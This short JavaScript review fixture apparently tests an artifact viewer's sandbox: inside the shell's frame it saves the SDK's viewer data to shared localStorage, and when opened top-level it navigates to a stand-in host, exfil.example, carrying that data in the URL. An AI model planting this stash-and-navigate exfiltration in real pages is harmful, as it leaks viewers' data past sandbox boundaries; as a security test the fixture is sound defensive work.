// Review fixture. In the shell's frame: stash what the SDK shows in the shared content-origin
// storage. Opened top-level (no sandbox, no shell frame-src): send the stash away by plain navigation.
if (top !== self) {
  await window.artifact.ready;
  localStorage.setItem("stash", JSON.stringify(window.artifact.viewer));
  document.getElementById("out").textContent = "stashed";
} else {
  location.href = "https://exfil.example/leak?d=" + encodeURIComponent(localStorage.getItem("stash"));
}
